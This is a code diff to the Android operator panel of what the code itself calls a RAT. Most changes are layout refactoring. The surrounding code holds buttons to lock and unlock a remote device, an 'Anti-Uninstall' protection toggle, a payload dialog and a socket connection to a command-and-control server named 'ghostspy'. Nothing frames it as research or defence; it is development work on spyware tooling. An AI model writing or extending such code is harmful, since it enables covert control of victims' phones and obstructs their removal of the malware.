@@ -31,12 +31,20 @@ public class ControlActivity extends Activity {
         String model = getIntent().getStringExtra("deviceModel");
         String battery = getIntent().getStringExtra("battery");
 
+        // Root layout dengan ScrollView
         LinearLayout root = new LinearLayout(this);
         root.setOrientation(LinearLayout.VERTICAL);
         root.setBackgroundColor(0xFF090909);
         setContentView(root);
 
-        // Header
+        ScrollView scrollView = new ScrollView(this);
+        scrollView.setFillViewport(true);
+
+        LinearLayout content = new LinearLayout(this);
+        content.setOrientation(LinearLayout.VERTICAL);
+        content.setPadding(0, 0, 0, 32);
+
+        // ========== HEADER ==========
         LinearLayout header = new LinearLayout(this);
         header.setOrientation(LinearLayout.HORIZONTAL);
         header.setGravity(Gravity.CENTER_VERTICAL);
@@ -67,13 +75,13 @@ public class ControlActivity extends Activity {
         notif.setBackground(getDrawable(R.drawable.btn_admin));
         notif.setPadding(10, 4, 10, 4);
         header.addView(notif);
-        root.addView(header);
+        content.addView(header);
 
-        // Panel Lock/Unlock
+        // ========== PANEL LOCK/UNLOCK ==========
         LinearLayout lockPanel = new LinearLayout(this);
         lockPanel.setOrientation(LinearLayout.HORIZONTAL);
         lockPanel.setGravity(Gravity.CENTER);
-        lockPanel.setPadding(16, 16, 16, 0);
+        lockPanel.setPadding(16, 16, 16, 8);
 
         Button lockScreenBtn = new Button(this);
         lockScreenBtn.setText("🔒 Lock Screen");
@@ -96,13 +104,13 @@ public class ControlActivity extends Activity {
         unlockBtn.setLayoutParams(unlockBtnParams);
         unlockBtn.setOnClickListener(v -> sendCmd("unlock"));
         lockPanel.addView(unlockBtn);
-        root.addView(lockPanel);
+        content.addView(lockPanel);
 
-        // Panel Alat Tambahan
+        // ========== PANEL ALAT TAMBAHAN ==========
         LinearLayout toolsPanel = new LinearLayout(this);
         toolsPanel.setOrientation(LinearLayout.HORIZONTAL);
         toolsPanel.setGravity(Gravity.CENTER);
-        toolsPanel.setPadding(16, 8, 16, 0);
+        toolsPanel.setPadding(16, 8, 16, 8);
 
         Button antiUninstallBtn = new Button(this);
         antiUninstallBtn.setText("🛡️ Anti-Uninstall");
@@ -141,11 +149,9 @@ public class ControlActivity extends Activity {
         payloadBtn.setLayoutParams(toolBtnParams);
         payloadBtn.setOnClickListener(v -> showPayloadDialog());
         toolsPanel.addView(payloadBtn);
+        content.addView(toolsPanel);
 
-        root.addView(toolsPanel);
-
-        // Grid Menu 2 kolom
-        ScrollView scroll = new ScrollView(this);
+        // ========== GRID MENU 2 KOLOM ==========
         LinearLayout grid = new LinearLayout(this);
         grid.setOrientation(LinearLayout.VERTICAL);
         grid.setPadding(16, 12, 16, 12);
@@ -174,18 +180,24 @@ public class ControlActivity extends Activity {
             }
             row.addView(createMenuCard(items[i]));
         }
-        scroll.addView(grid);
-        root.addView(scroll);
+        content.addView(grid);
 
-        // Control Center
+        // ========== CONTROL CENTER ==========
         TextView controlCenter = new TextView(this);
         controlCenter.setText("🎛️ Control Center");
         controlCenter.setTextColor(0xFFFFFFFF);
         controlCenter.setBackground(getDrawable(R.drawable.card_admin));
         controlCenter.setPadding(16, 12, 16, 12);
         controlCenter.setGravity(Gravity.CENTER);
+        LinearLayout.LayoutParams ccParams = new LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
+        ccParams.setMargins(16, 0, 16, 0);
+        controlCenter.setLayoutParams(ccParams);
         controlCenter.setOnClickListener(v -> showControlPopup());
-        root.addView(controlCenter);
+        content.addView(controlCenter);
+
+        scrollView.addView(content);
+        root.addView(scrollView);
 
         try {
             socket = IO.socket("https://ghostspy.bruang.biz.id");
@@ -193,6 +205,7 @@ public class ControlActivity extends Activity {
         } catch (URISyntaxException e) {}
     }
 
+    // ========== DIALOG METHODS ==========
     private void showAntiUninstallDialog() {
         AlertDialog.Builder b = new AlertDialog.Builder(this);
         b.setTitle("🛡️ Anti-Uninstall Protection");
@@ -203,7 +216,7 @@ public class ControlActivity extends Activity {
         CheckBox toggle = new CheckBox(this);
         toggle.setText("Aktifkan Anti-Uninstall");
         toggle.setTextColor(0xFFFFFFFF);
-        toggle.setChecked(true); // asumsi saat ini aktif, bisa diambil dari data RAT nanti
+        toggle.setChecked(true);
         lay.addView(toggle);
 
         b.setView(lay);
